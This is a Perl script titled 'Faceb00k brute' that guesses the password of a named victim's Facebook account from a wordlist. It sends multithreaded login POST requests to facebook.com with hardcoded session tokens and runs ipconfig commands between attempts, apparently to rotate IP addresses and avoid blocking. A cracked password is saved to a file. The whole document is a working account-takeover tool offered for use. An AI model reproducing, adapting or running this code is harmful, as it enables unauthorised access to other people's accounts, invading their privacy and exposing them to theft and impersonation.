#!/usr/bin/perl

#Please, use batch file to run with dictionary!

use strict;use warnings;use Net::SSLeay::Handle;use threads;use Term::ANSIColor qw(:constants);
my $ignorer = 1;my @commands = qw(ipconfig/release ipconfig/flushdns ipconfig/renew ipconfig/registerdns);my $check;
my($wordlist,@threads, @a, @aa, $type, $counter, $i);my ($user, $total);my $stop :shared = 0;my $ini = 0;my $thr = 15;my $fin = $thr - 1;start(1);
#multithread();
sub start {
#$USER = "VICTIMID" -> IMPOOOOOOOORTANT >>>
#------------------------------------------------------------------------------#
$type = "fb";$wordlist = "$ARGV[0]";$user = "VICTIMID";$i = 1350;
#------------------------------------------------------------------------------#
banner();
$check = check_complete();
if ($check eq "return 1") {
	#print "Skipped\n";
	return 1;
} else {
	#print "Not skipped\n";
}
for (<*>) { if (!(-f $wordlist)) { #print "\nWordlist not found\n"; system("pause"); exit(0);} 
return 1;}}
push @commands, "TIMEOUT /T 150";
for (@commands) {
my $ls = `$_`;
print "Running $_\n";
}
$type = \&$type;
@a = <LIST>;
@aa = grep { !/^$/ } @a;
close (LIST);
if (shift eq "1") {singlethread();} else {multithread();} 
}

sub banner {
open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";print(BRIGHT_GREEN."[+]".RESET.BRIGHT_RED."Faceb00k brute - Xandyn69\n".RESET);
print("\n".BRIGHT_BLUE."[+]".RESET.BRIGHT_YELLOW."Threads number\t:\t$thr".RESET);print("\n".BRIGHT_BLUE."[+]".RESET.BRIGHT_YELLOW."Facebook victim\t:\t$user".RESET);
print("\n".BRIGHT_BLUE."[+]".RESET.BRIGHT_YELLOW."Wordlist file\t:\t$wordlist\n". RESET);print("\n".BRIGHT_RED."[+]".RESET.BRIGHT_GREEN."Reading dictionary ... wait for while please\n".RESET);
}

sub singlethread {
$i = 0;
	for (@aa) {
		print BOLD RED.'[-] id : ' . $i  . RESET. BRIGHT_GREEN."\t\tTrying => $aa[$i]" . RESET;
		fb($aa[$i]);
		$i++;
		report_ignore($i);
		if ($check eq "return 1") {
			return 1
		}
	}
	report_ignore("finished");
}

sub check_complete {
my ($temp, $temp2, $gl);
open MELHORES, "<complete.txt" or return 0;
	while (<MELHORES>) { 
			if ($_ =~ /ignore_1: (.+) 100% complete/ig) {
			 $temp = $1;
			 $temp =~ s/.+\/.+\/(.+\.txt)/$1/ig;
			 $temp2 = $wordlist;
			 $temp2 =~ s/.+\/.+\/(.+\.txt)/$1/ig;
			 #print "Checking if $temp its equal to $temp2\n";
				 if ($temp eq $temp2) {
				 $gl += 1;
				 }
					if ($gl) { #IMMEDIATE CHECK
						return "return 1";
					}
			}
	}
undef $temp;
undef $temp2;
close (MELHORES);
return 0;
}

sub report_ignore {
if ($ignorer) {open M, ">ignore.txt";}my $unk;$unk = shift;
if ($unk eq "finished") {open MON, ">>complete.txt";print MON "\nignore_1: $wordlist 100% complete\n";close(MON);};
if ($stop eq 0 && $unk =~ /\d+/ig && $unk) {print M ("ignore_1: at " . $unk);}
if ($ignorer) {close(M);}

}

sub multithread {
	while(1){
		@threads = ();
		die("\n\n".BRIGHT_GREEN."[+]".RESET." 100% complete\n\n" . RESET) if $stop;
		for($i=$ini;$i<=$fin;$i++){
			push(@threads,$i);
		}
		foreach(@threads){
				$_ = threads->create(\&brute);
		}
		foreach(@threads){
			$_->join();
		}
		print("\n\n".BRIGHT_GREEN."[+]".RESET." 100% complete\n\n" . RESET) if $stop;
		exit(0) if $stop;
		for($i=$ini;$i<=$fin;$i++){
			$total++;
			last if $stop;
			print BOLD RED.'[-]'. 'id:' . $total . RESET. BRIGHT_GREEN." Trying => $aa[$i]" . RESET if ($i eq $fin && defined($aa[$i]));
		}
		$ini = $fin + 1;
		$fin = $fin + $thr;
	}
	sub brute {
	my $id = threads->tid();
	threads->exit() if $stop;
	$id--;
	if(defined($aa[$id])){
	&$type($aa[$id]);
	} else {
		$stop = 1;
	}
}
}

sub fb {
my $password = shift;
#$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
#
my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";
#
my ($host, $port) = ("www.facebook.com", 443);
#
tie(*SSL, "Net::SSLeay::Handle", $host, $port);
#
print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";
#
print SSL "$post\n";
my $success;
	while(my $result = <SSL>){
		if($result =~ /Location(.*?)/){
		$success = $1;
		}
	}
		if (!defined $success)
		{
		#print "[-] $password -> Not Him :( \n";
		} else {
		print "\n########################################################\n";
		print "[+] Yuuup!! Pass Cracked => Pass is $password :D\n";
		print "########################################################\n\n";
		open F, ">mycrack.txt";
		print F $password;
		close (F);
		$stop = 1;
		exit(0);
		}
	close SSL;
}
